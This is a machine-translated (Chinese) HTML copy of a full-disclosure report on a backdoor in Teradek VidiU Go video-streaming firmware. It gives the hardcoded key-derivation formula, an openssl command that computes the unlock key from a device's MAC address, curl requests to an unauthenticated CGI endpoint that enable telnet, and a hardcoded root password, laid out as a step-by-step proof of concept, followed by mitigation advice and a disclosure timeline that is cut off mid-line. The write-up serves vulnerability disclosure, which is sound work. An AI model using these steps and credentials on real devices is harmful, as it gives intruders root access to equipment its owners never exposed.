<html>
<head>
<title>Full disclosure: 0-day RCE backdoor in Teradek IP video device firmwares</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">充分披露:0天RCE后门在Teradek IP视频设备固件</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/full-disclosure-0-day-rce-backdoor-in-teradek-ip-video-device-firmwares-85a16f346e15?source=collection_archive---------0-----------------------#2021-09-03">https://infosecwriteups.com/full-disclosure-0-day-rce-backdoor-in-teradek-ip-video-device-firmwares-85a16f346e15?source=collection_archive---------0-----------------------#2021-09-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="1073" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">这是一个0天后门程序的报告，允许远程根外壳访问Teradek IP视频设备。去年向制造商报告了这个问题，从那以后他们发布了新的固件版本，但是还没有修复。这就是为什么在这里这是完全的揭露。概念证明如下。</h2></div><h1 id="d5a4" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">关于设备</h1><p id="a073" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated"><a class="ae lt" href="https://teradek.com/" rel="noopener ugc nofollow" target="_blank"> Teradek </a> IP视频设备是实时流设备，能够将视频输入(如SDI、HDMI等)编码为支持以太网传输的各种流格式。Teradek生产的IP视频设备各不相同，但固件似乎非常相似(尤其是在后门功能方面)。我们已经分析了一个<a class="ae lt" href="https://teradek.com/collections/vidiu-go-family" rel="noopener ugc nofollow" target="_blank"> Teradek VidiU Go </a>模型。</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi lu"><img src="../Images/02080cb8cbf296cd18d28f5760b7bfd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zb7P30JCwDRNa5OcNv8vQw.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">Teradek VidiU Go IP视频流设备</figcaption></figure><p id="b660" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">默认情况下，该设备有一个以太网接口和一个可通过http:// <device_ip>访问的Web管理接口。Web管理界面受用户定义的密码保护。</device_ip></p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi mp"><img src="../Images/557b7dcf0e9f3dbfbe06cc837d502024.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EtAs8a9IZqpd9kIFoPwVYg.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">Teradek VidiU Go上用户自定义密码的登录提示</figcaption></figure><h1 id="624c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反转固件</h1><p id="0289" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated"><a class="ae lt" href="https://teradek.com/pages/downloads" rel="noopener ugc nofollow" target="_blank">可从制造商网站下载</a>固件映像。这些图像是未加密、未受保护的Squashfs文件，可以使用<a class="ae lt" href="https://github.com/plougher/squashfs-tools" rel="noopener ugc nofollow" target="_blank"> squashfs-tools </a>轻松解压。</p><p id="73a3" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">VidiU Go设备的<a class="ae lt" href="https://teradek.com/pages/downloads#vidiu-go" rel="noopener ugc nofollow" target="_blank">固件</a>构建在ARM64 Linux内核上。我们已经分析了3.1.12版本(2020年)，但是最新的3.1.13在这个报告的方面是完全一样的。</p><p id="c586" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">内置lighttpd服务器的Webroot是/home/www。文件夹/home/www/cgi-bin包含。cgi二进制文件，还有重要的依赖项(如。所以库)放在/usr/lib文件夹中。</p><p id="cb94" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">有很多有趣的函数需要分析，并且可能会发现更多的漏洞，但是让我们把重点放在/home/www/cgi-bin/test.cgi中的后门访问函数上。</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi mq"><img src="../Images/454e20df786e6880048156feb82b3136.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a11nLOzDRdnKMvjJ-lQcRw.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">Ghidra的反向测试. cgi</figcaption></figure><p id="8722" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">在牛逼的<a class="ae lt" href="https://ghidra-sre.org/" rel="noopener ugc nofollow" target="_blank"> Ghidra </a>工具的帮助下，对test.cgi的main()函数进行一个简短的基本逆向工程过程后，很容易看出</p><ul class=""><li id="401f" class="mr ms iq kz b la mk ld ml lg mt lk mu lo mv ls mw mx my mz bi translated"><code class="fe na nb nc nd b">http://&lt;ip_of_the_device&gt;/cgi-bin/test.cgi</code>无需认证即可访问</li><li id="0c3b" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls mw mx my mz bi translated">用GET参数<code class="fe na nb nc nd b">command=remote-access test.cgi</code>调用<code class="fe na nb nc nd b">/usr/share/system/remote-access.sh</code>用参数start/stop依赖于另一个GET参数enable=0/1</li><li id="e9d5" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls mw mx my mz bi translated">脚本<code class="fe na nb nc nd b">/usr/share/system/remote-access.sh</code>启动/停止telnetd，允许任何人通过网络访问设备上的23/tcp端口。</li><li id="8d4e" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls mw mx my mz bi translated">为了使用<code class="fe na nb nc nd b">command=remote-access</code>，应提供一个与<code class="fe na nb nc nd b">td_license_create(“tdtest”, 0, 0)</code>相比较的合适的关键参数。</li></ul><h1 id="8840" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反转关键计算</h1><p id="81fe" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">td_license_create()函数在libtd.so库中实现。</p><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi nj"><img src="../Images/73844cddb99ca744efd20c4dac38bb81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pQJxq_JASVZalwb66ECdyQ.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">逆转加密密钥生成</figcaption></figure><p id="82e9" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">颠倒加密函数显示密钥计算如下:</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="9397" class="no kg iq nd b gy np nq l nr ns">td_license_create(“tdtest”, 0, 0) = SHA1(SHA512(“0x5f3759df&lt;MAC_ADDRESS_OF_DEVICE&gt;tdtest”))</span></pre><p id="419c" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">这意味着密钥计算所需的一切都被硬编码在通用固件中，只有MAC地址部分与设备相关。因为MAC地址对于同一个局域网的人来说很容易知道，所以可以计算出打开telnet接口的密钥。</p><h1 id="df78" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">启用Telnet接口</h1><p id="3a0e" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">因此，可以使用OpenSSL的以下Linux命令来计算所需的密钥(以MAC地址DE:AD:BE:EF:00:00为例):</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="97c0" class="no kg iq nd b gy np nq l nr ns">echo -n 0x5f3759dfDE:AD:BE:EF:00:00tdtest | openssl dgst -sha512 -binary — | openssl dgst -sha1 — | cut -d’ ‘ -f2</span></pre><p id="31ef" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">结果是:<code class="fe na nb nc nd b">2f1a4cf8d815c99f70268c0873c9dffb13015052</code>。</p><p id="7fa1" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">现在，可以使用以下GET请求启用telnet接口(假设设备IP是192.168.0.10):</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="ab24" class="no kg iq nd b gy np nq l nr ns">curl 'http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&amp;command=remote-access&amp;enable=1'</span></pre><p id="0a70" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">HTTP响应为500(如果密钥错误，则为404)，但是telnet接口被启用。</p><p id="88f3" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">要禁用，只需使用<code class="fe na nb nc nd b">enable=0</code>:</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="072d" class="no kg iq nd b gy np nq l nr ns">curl 'http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&amp;command=remote-access&amp;enable=0'</span></pre><h1 id="b663" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根凭据</h1><p id="d01e" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">现在Telnet已启用，连接会给出一个登录提示。对于凭证，在固件映像中查找<code class="fe na nb nc nd b">/etc/shadow</code>:</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="fcb1" class="no kg iq nd b gy np nq l nr ns">root:HjMedVB3oPf0o:11851:0:99999:7:::</span></pre><p id="d584" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">不错，这是一个传统的弱Unix crypt() DES hash，在很短的时间内(大约3天)100%可破解。此外，破解后，密码被证明是非常脆弱的，但这并不重要，我们无论如何都会破解它。</p><p id="929c" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">root访问的破解凭据:</p><pre class="lv lw lx ly gt nk nd nl nm aw nn bi"><span id="dc3c" class="no kg iq nd b gy np nq l nr ns">root:upsetdac</span></pre><p id="8377" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">游戏结束。具有(本地)网络访问权限的任何人都可以枚举MAC地址，可以计算启用telnet所需的密钥(使用硬编码的值)，可以启用telnet接口(无需提供任何额外的凭据，无论用户定义的密码是什么)，并且可以以root用户身份远程登录(使用硬编码的静态root用户密码)并拥有设备。</p><h1 id="1d47" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">概念证明摘要</h1><ol class=""><li id="11d0" class="mr ms iq kz b la lb ld le lg nt lk nu lo nv ls nw mx my mz bi translated">枚举MAC地址(<code class="fe na nb nc nd b">DE:AD:BE:EF:00:00</code>)</li><li id="da24" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls nw mx my mz bi translated">计算关键:<code class="fe na nb nc nd b">echo -n 0x5f3759dfDE:AD:BE:EF:00:00tdtest | openssl dgst -sha512 -binary — | openssl dgst -sha1 — | cut -d’ ‘ -f2</code>(结果是<code class="fe na nb nc nd b">2f1a4cf8d815c99f70268c0873c9dffb13015052</code>)</li><li id="df3c" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls nw mx my mz bi translated">启用远程登录:<code class="fe na nb nc nd b">curl ‘http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&amp;command=remote-access&amp;enable=1'</code></li><li id="eaf9" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls nw mx my mz bi translated">使用用户<code class="fe na nb nc nd b">root</code>和密码<code class="fe na nb nc nd b">upsetdac</code>登录<code class="fe na nb nc nd b">telnet 192.168.0.10</code>。</li></ol><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi nx"><img src="../Images/ab6bf003f36bd2ac08a2e1dfd91377b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WH0xz99p2o3YKidUB7FOuw.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">用于在Teradek VidiU Go上启用telnet + root登录的PoC</figcaption></figure><figure class="lv lw lx ly gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi ny"><img src="../Images/ac330da94c25dd62980f2d3cf40af185.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wytlk0vZb1aCvW_1jvZW8w.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">用于禁用Teradek VidiU Go上的telnet接口的PoC</figcaption></figure><h1 id="6cb5" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">受影响的固件</h1><ul class=""><li id="f6c6" class="mr ms iq kz b la lb ld le lg nt lk nu lo nv ls mw mx my mz bi translated">Teradek VidiU Go 3.1.12(发布于2020年6月8日)</li><li id="1b0e" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls mw mx my mz bi translated">Teradek VidiU Go 3.1.13(发布于2021年5月10日，撰写本文时最新发布)</li><li id="bc1a" class="mr ms iq kz b la ne ld nf lg ng lk nh lo ni ls mw mx my mz bi translated">可能还有用于其他设备的其他Teradek固件(在其他固件中看到了相同的代码和相同的硬编码哈希，但是需要测试)。</li></ul><h1 id="a703" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">减轻</h1><p id="e8c1" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">没有修复，制造商应该知道这个后门，但显然不感兴趣，不打算打补丁。所以解决办法只有缓解。</p><p id="e4e6" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">因为没有办法禁用后门程序和/或更改硬编码的密钥/密码，唯一的缓解措施是向web界面添加另一层(网络/反向代理)保护层(除了用户定义的密码之外):只限制可信网络/用户对web界面(或设备)的访问。</p><p id="8d98" class="pw-post-body-paragraph kx ky iq kz b la mk jr lc ld ml ju lf lg mm li lj lk mn lm ln lo mo lq lr ls ij bi translated">例如，将其置于NAT/防火墙之后，并使用一些安全服务(如SSH隧道或反向代理，仅对受信任的用户进行身份验证)通过凭证来访问设备。</p><h1 id="96e3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">时间表</h1><p id="fe1e" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">12–01–2020:联系Teradek，开始负责任的披露过程<br/>12–11–2020:再次联系Teradek，因为没有回复<br/>12–14–2020:tera dek询问细节<br/>12–15–2020:分享一些细节<br/>12–15–2020:tera dek询问更多细节<br/>12–15–2020:分享一些更多细节<br/>020</p><h1 id="a5aa" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">更新</h1><p id="6b79" class="pw-post-body-paragraph kx ky iq kz b la lb jr lc ld le ju lf lg lh li lj lk ll lm ln lo lp lq lr ls ij bi translated">在发布这份完整的披露报告后的24小时内，Teradek回复了(在Twitter上，在这里，在线程:<a class="ae lt" href="https://twitter.com/an0n_r0/status/1433591276369219585" rel="noopener ugc nofollow" target="_blank">https://twitter.com/an0n_r0/status/1433591276369219585</a>)并承诺在2周内修复。太棒了，谢谢！:)</p></div></div>    
</body>
</html>